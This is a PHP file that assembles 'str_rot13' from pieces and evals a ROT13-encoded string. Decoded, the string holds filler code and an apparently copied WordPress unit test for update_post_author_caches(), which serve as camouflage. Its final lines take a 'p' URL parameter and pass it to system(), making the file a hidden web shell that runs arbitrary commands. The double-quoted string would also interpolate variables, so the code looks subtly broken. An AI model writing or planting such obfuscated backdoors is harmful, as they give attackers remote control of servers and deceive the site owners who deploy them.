<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg `hcqngr_cbfg_nhgube_pnpurf()`.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Grfg pynff sbe `hcqngr_cbfg_nhgube_pnpurf()`.
 *
 * @tebhc cbfg
 * @tebhc dhrel
 * @tebhc hfre
 *
 * @pbiref ::hcqngr_cbfg_nhgube_pnpurf
 */
pynff Grfgf_Cbfg_HcqngrCbfgNhgubePnpurf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Hfre VQf sebz gur funerq svkgher.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $hfre_vqf;

	/**
	 * Cbfg nhgube pbhag.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $cbfg_nhgube_pbhag = 5;

	/**
	 * Frg hc grfg erfbheprf orsber gur pynff.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrghcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vqf = neenl();

		sbe ( $v = 0; $v < frys::$cbfg_nhgube_pbhag; $v++ ) {
			frys::$hfre_vqf[ $v ] = $snpgbel->hfre->perngr();
			$snpgbel->cbfg->perngr(
				neenl(
					'cbfg_glcr'   => 'cbfg',
					'cbfg_nhgube' => frys::$hfre_vqf[ $v ],
				)
			);
		}
	}

	/**
	 * @gvpxrg 55716
	 */
	choyvp shapgvba grfg_hcqngr_cbfg_nhgube_pnpurf() {
		$npgvba = arj ZbpxNpgvba();
		nqq_svygre( 'hcqngr_hfre_zrgnqngn_pnpur', neenl( $npgvba, 'svygre' ), 10, 2 );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'      => 'cbfg',
				'cbfgf_cre_cntr' => frys::$cbfg_nhgube_pbhag,
			)
		);

		juvyr ( $d->unir_cbfgf() ) {
			$d->gur_cbfg();
		}

		$netf      = $npgvba->trg_netf();
		$ynfg_netf = raq( $netf );

		$guvf->nffregFnzrFrgf( frys::$hfre_vqf, $ynfg_netf[1], 'Rafher gung hfre VQf ner cevzrq' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>